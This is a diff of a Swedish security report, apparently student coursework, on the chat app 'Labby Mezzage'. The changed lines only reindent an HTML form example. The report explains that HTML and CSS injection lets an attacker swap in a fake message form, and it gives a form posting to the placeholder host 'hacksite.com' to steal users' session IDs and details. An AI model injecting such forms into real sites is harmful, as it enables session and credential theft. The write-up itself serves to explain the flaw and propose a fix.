@@ -46,16 +46,16 @@ Det viktiga är att man validerar man ska alltid se till så att man säkrar att
 
 I Labby Mezzage kan man inte mata in script taggar, men däremot så kan man mata in HTML och CSS. Detta gör att man kan påverka sidans utseende. Detta kanske låter harmlöst men man kan till exempel dölja fältet där man matar in meddelandet och sedan göra ett eget, som inte bara skickar ett meddelande till sidans server utan som också skickar vidare användarens sessionID och uppgifter. Det ända man hade behövt göra är att skriva detta i meddelande rutan
 
- <form action="hacksite.com/HackTheTHing.php">
-   E-post:
-
-  <input type="text" name="epost" value="exampel@ex.com">
-  <br>
-  Message:
- <input type="text" name="message" value="">
-  <br><br>
-  <input type="submit" value="Submit">
- </form>
+  <form action="hacksite.com/HackTheTHing.php">
+    E-post:
+ 
+   <input type="text" name="epost" value="exampel@ex.com">
+   <br>
+   Message:
+  <input type="text" name="message" value="">
+   <br><br>
+   <input type="submit" value="Submit">
+  </form>
 
 
 ##### Förslag på lösning
